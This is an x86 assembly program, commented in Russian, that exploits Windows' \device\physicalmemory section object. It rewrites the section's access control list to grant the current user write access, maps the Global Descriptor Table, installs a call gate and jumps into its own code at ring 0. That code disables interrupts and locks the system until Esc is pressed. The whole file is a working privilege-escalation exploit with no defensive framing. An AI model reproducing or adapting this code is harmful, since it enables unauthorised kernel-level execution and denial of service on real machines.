.386p
.model flat,stdcall

callW	macro   x
	extern  x:PROC
	call    x     
endm			

SECTION_QUERY =       0001h
SECTION_MAP_WRITE =   0002h
SECTION_MAP_READ =    0004h
SECTION_MAP_EXECUTE = 0008h
SECTION_EXTEND_SIZE = 0010h
SECTION_MAP_READ_WRITE	= 0006h
READ_CONTROL_WRITE_DAC	= 60000h

OBJ_INHERIT  =           00000002h
OBJ_PERMANENT =          00000010h
OBJ_EXCLUSIVE  =         00000020h
OBJ_CASE_INSENSITIVE  =  00000040h
OBJ_OPENIF            =  00000080h
OBJ_OPENLINK          =  00000100h
OBJ_VALID_ATTRIBUTES  =  000001F2h

object_attributes	struct
	Length						dd ?
	RootDirectory				dd ?
	ObjectName					dd ?
	Attributes					dd ?
	SecurityDescriptor			dd ?
	SecurityQualityOfService	dd ?
ends

.data
physmemName			db "\",0,"d",0,"e",0,"v",0,"i",0,"c",0,"e",0,"\",0,"p",0,"h",0,"y",0,"s",0,"i",0,"c",0,"a",0,"l",0,"m",0,"e",0,"m",0,"o",0,"r",0,"y",0,0,0;
physmemString		dd ?
physmem				dd ?
currentuser			db "CURRENT_USER", 0
.code
begin:		

; В стеке отводим немного памяти
		sub			ESP, 16

; Пытаемся поиметь физическую память (\device\physicalmemory) 
		mov			EAX, SECTION_MAP_READ_WRITE
		call		OpenPhysicalMemory
		test		EAX, EAX
		jne			GDT_Find_Ok

; Если не получилось, то откраваем её же, но с более низкими правами		
		mov			EAX, READ_CONTROL_WRITE_DAC
		call		OpenPhysicalMemory
		
; "Добиваемся" необходимого доступа
		call		GainSectionAccess

; Еще раз пытаемся отъиметъ физическую память
		mov			EAX, SECTION_MAP_READ_WRITE
		call		OpenPhysicalMemory
		test		EAX, EAX
		jne			GDT_Find_Ok

; Если всё же не удалось, например, мы не под админом?	То валим...
		jmp			Exit_begin		
GDT_Find_Ok:
		mov			EDI, EAX

; EDI = хэндл физической памяти
		
; Это понятно :)
		sgdt		6 ptr [ESP]

		movsx		EAX, 2 ptr [ESP+4]
		shl			EAX, 16
		movsx		EDX, 2 ptr [ESP+2]
		or			EAX, EDX
		cmp			EAX, 80000000h
		jb			Clearing
		cmp			EAX, 0A0000000h
		jb			AndWith1FFFF000h
Clearing:
		xor			EBX, EBX
		jmp			EndAndWith1FFFF000h
AndWith1FFFF000h:
		movsx		EBX, 2 ptr [ESP+4]
		shl			EBX, 16
		movsx		EAX, 2 ptr [ESP+2]
		or			EBX, EAX
		and			EBX, 1FFFF000h
EndAndWith1FFFF000h:
; EBX = mapaddr
		
		movsx		EDX,2 ptr [ESP]
		inc			EDX
		push		EDX
		push		EBX
		push		0
		push		6
		push		EDI
		callW		MapViewOfFile
		mov			ESI,EAX
; ESI = base_addr

		test		ESI, ESI
		je			Exit_begin

		lea			EBX, 4 ptr [ESI+8]
		jmp			CiclEnd

; Тут сложный цикл, в котором ищется свободный дескриптор...
CiclStart:
		test		1 ptr [EBX+5], 15
		jne			FindNextDescriptor
		mov			EAX, offset Ring0Code
		add			ESP, 8
		mov			EDX, EAX
		and			DX, -1
		mov			2 ptr [EBX], DX

		mov			EDX,EAX
		mov			2 ptr [EBX+2], 8
		and			1 ptr [EBX+4], -16
		and			1 ptr [EBX+4], 15
		mov			CL, 1 ptr [EBX+5]
		and			CL, -16
		or			CL, 12
		mov			1 ptr [EBX+5], CL
		and			1 ptr [EBX+5], -17
		or			1 ptr [EBX+5], 96
		or			1 ptr [EBX+5], -128
		shr			EDX, 16
		mov			2 ptr [EBX+6], DX

		sub			BX, SI
		or			BX, 3
		mov			2 ptr [ESP+12], BX

; Сдесь мы лочим наш РИНГ0 код в памяти, для того чтоб она случайно не 
; выгрузилась куда-нить в свап... Но это маловероятно, поэтому и закоментарили
;		push		4095
;		push		EAX
;		callW		VirtualLock

; Переходим в НОЛЬ
		call		6 ptr [2 ptr [ESP+8]] 

		push		EDI
		callW		NtClose

		jmp			short Exit_begin

FindNextDescriptor:

		add			EBX, 8
CiclEnd:
		movsx		ECX, 2 ptr [ESP]
		add			ECX, ESI
		inc			ECX
		mov			EAX, EBX
		cmp			ECX, EAX
		ja			CiclStart

		push		EDI
		callW		NtClose
			
Exit_begin:
		add			ESP, 16
		push		0
		callW		ExitProcess

; ========================== Ring0 =========================================
; Процедура работает в нулевом кольце:
; Блокирует всю систему до нажатия Esc :) Как обычно в общем-то...
Ring0Code:
WaitESC:
	 	cli	
	 	in			al, 60h
	 	cmp			al, 1
		jne			short WaitESC
	 	sti
		retf
; ========================== /Ring0 ========================================		

; ========================== OpenPhysicalMemory ============================
OpenPhysicalMemory:
		push		EBX
		sub			ESP, 24
		mov			EBX, EAX

		push		offset physmemName
		push		offset physmemString
		callW		RtlInitUnicodeString
		
		xor			ECX, ECX
		mov			4 ptr [ESP.Length], size object_attributes
		mov			4 ptr [ESP.RootDirectory], ECX
		mov			4 ptr [ESP.ObjectName], offset physmemString
		mov			4 ptr [ESP.Attributes], OBJ_CASE_INSENSITIVE
		mov 		4 ptr [ESP.SecurityDescriptor], ECX
		mov			4 ptr [ESP.SecurityQualityOfService], ECX

		push		ESP
		push		EBX
		push		offset physmem
		callW		NtOpenSection

		test		EAX, EAX
		jge			short Exit_OpenPhysicalMemory

		xor			EAX, EAX
		jmp			short Exit_OpenPhysicalMemory_Error

Exit_OpenPhysicalMemory:
		mov			EAX, [physmem]

Exit_OpenPhysicalMemory_Error:
		add			ESP, 24
		pop			EBX
		ret
; ========================== /OpenPhysicalMemory ===========================

; =========================== GainSectionAccess ============================
GainSectionAccess:
		push		EBX
		push		ESI
		sub			ESP, 44
		mov			ESI, EAX
		xor			EAX, EAX
		xor			EDX, EDX
		mov			4 ptr [ESP], EAX
		mov			4 ptr [ESP+4], EDX
		xor			ECX, ECX

		lea			EAX, 4 ptr [ESP+8]
		mov			4 ptr [ESP+8], ECX
		push		EAX
		push		0
		lea			EDX, 4 ptr [ESP+8]
		push		EDX
		push		0
		push		0
		push		4
		push		6
		push		ESI
		callW		GetSecurityInfo
		test		EAX, EAX
		setne		BL
		and			EBX, 1
		test		EBX, EBX
		jne			short CleanUp

		push		32
		push		0
		lea			EAX, 4 ptr [ESP+20]
		push		EAX
		callW		memset
		add			ESP, 12

		xor			EDX, EDX
		mov			4 ptr [ESP+12], SECTION_MAP_WRITE
		mov			4 ptr [ESP+16], 1
		mov			4 ptr [ESP+20], EDX

		lea			ECX, 4 ptr [ESP+4]
		mov			4 ptr [ESP+32],1
		mov			4 ptr [ESP+36],1
		mov			4 ptr [ESP+40], offset currentuser
		push		ECX
		push		4 ptr [ESP+4]
		lea			EAX, 4 ptr [ESP+20]
		push		EAX
		push		1
		callW		SetEntriesInAclA
		test		EAX, EAX
		setne		BL
		and			EBX, 1
		test		EBX, EBX
		jne			short CleanUp

		push		0
		push		4 ptr [ESP+8]
		push		0
		push		0
		push		4
		push		6
		push		ESI
		callW		SetSecurityInfo
		test		EAX, EAX
		setne		BL
CleanUp:
		cmp			4 ptr [ESP+8],0
		je			short LocalFreeOnece

		push		4 ptr [ESP+8]
		callW		LocalFree

LocalFreeOnece:
		cmp			4 ptr [ESP+4], 0
		je			short NoLocalFree

		push		4 ptr [ESP+8]
		callW		LocalFree

NoLocalFree:
		add			ESP, 44
		pop			ESI
		pop			EBX
		ret 
; =========================== /GainSectionAccess ===========================

end begin